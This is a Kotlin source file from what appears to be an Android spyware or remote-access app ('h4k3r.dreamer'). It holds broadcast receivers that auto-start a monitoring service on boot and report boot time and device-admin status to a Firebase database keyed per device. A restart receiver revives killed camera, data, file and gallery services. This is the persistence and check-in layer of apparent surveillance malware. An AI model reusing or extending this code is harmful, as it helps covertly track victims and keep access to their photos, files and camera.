package com.h4k3r.dreamer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import android.app.admin.DeviceAdminReceiver
import android.widget.Toast
import android.util.Log

/* ── Boot Receiver for Auto-Start ─────────────── */
class BootReceiver : BroadcastReceiver() {
    private val TAG = "BootReceiver"

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED -> {
                Log.d(TAG, "Boot completed - starting services")

                // Start PermissionMonitorService using regular startService to avoid crashes
                val serviceIntent = Intent(context, PermissionMonitorService::class.java)
                context.startService(serviceIntent)

                // Update Firebase status
                updateBootStatus(context)
            }
        }
    }

    private fun hasRequiredPermissions(context: Context, permissions: List<String>): Boolean {
        if (permissions.isEmpty()) return true

        return permissions.all { permission ->
            try {
                ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
            } catch (e: Exception) {
                Log.w(TAG, "Error checking permission: $permission", e)
                false
            }
        }
    }

    private fun updateBootStatus(context: Context) {
        try {
            val prefs = context.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
            val key = prefs.getString("secret_key", null)
            val deviceId = prefs.getString("device_id", null)

            if (key != null && deviceId != null) {
                Firebase.database.reference
                    .child("devices")
                    .child(key)
                    .child(deviceId)
                    .child("info")
                    .child("last_boot")
                    .setValue(System.currentTimeMillis())
                Log.d(TAG, "Boot status updated in Firebase")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update boot status", e)
        }
    }
}

/* ── Permission Check Receiver ────────────────── */
class PermissionCheckReceiver : BroadcastReceiver() {
    private val TAG = "PermissionCheckReceiver"

    override fun onReceive(context: Context, intent: Intent) {
        try {
            Log.d(TAG, "Permission check triggered")
            // Update permissions in Firebase
            val permissionService = Intent(context, PermissionMonitorService::class.java)
            ContextCompat.startForegroundService(context, permissionService)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start permission monitor service", e)
        }
    }
}

/* ── Device Admin Receiver (Optional) ─────────── */
class DeviceAdminReceiver : DeviceAdminReceiver() {
    private val TAG = "DeviceAdminReceiver"

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)

        updateAdminStatus(context, true)
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)

        updateAdminStatus(context, false)
    }

    private fun updateAdminStatus(context: Context, enabled: Boolean) {
        try {
            val prefs = context.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
            val key = prefs.getString("secret_key", null)
            val deviceId = prefs.getString("device_id", null)

            if (key != null && deviceId != null) {
                Firebase.database.reference
                    .child("devices")
                    .child(key)
                    .child(deviceId)
                    .child("info")
                    .child("device_admin")
                    .setValue(enabled)
                Log.d(TAG, "Admin status updated: $enabled")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update admin status", e)
        }
    }
}

/* ── Service Restart Receiver ─────────────────── */
class ServiceRestartReceiver : BroadcastReceiver() {
    private val TAG = "ServiceRestartReceiver"

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "Service restart triggered: ${intent.action}")

        // This receiver is triggered when a service is killed
        // It will restart the service that was killed
        val serviceClass = when (intent.action) {
            "com.h4k3r.dreamer.RESTART_CAMERA" -> CameraService::class.java
            "com.h4k3r.dreamer.RESTART_DATA" -> DataService::class.java
            "com.h4k3r.dreamer.RESTART_FILES" -> FilesService::class.java
            "com.h4k3r.dreamer.RESTART_GALLERY" -> GalleryService::class.java
            "com.h4k3r.dreamer.RESTART_PERMISSION" -> PermissionMonitorService::class.java
            else -> null
        }

        serviceClass?.let {
            try {
                val serviceIntent = Intent(context, it)
                ContextCompat.startForegroundService(context, serviceIntent)
                Log.d(TAG, "Restarted service: ${it.simpleName}")
            } catch (e: SecurityException) {
                Log.e(TAG, "Security exception restarting service: ${it.simpleName}", e)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restart service: ${it.simpleName}", e)
            }
        }
    }
}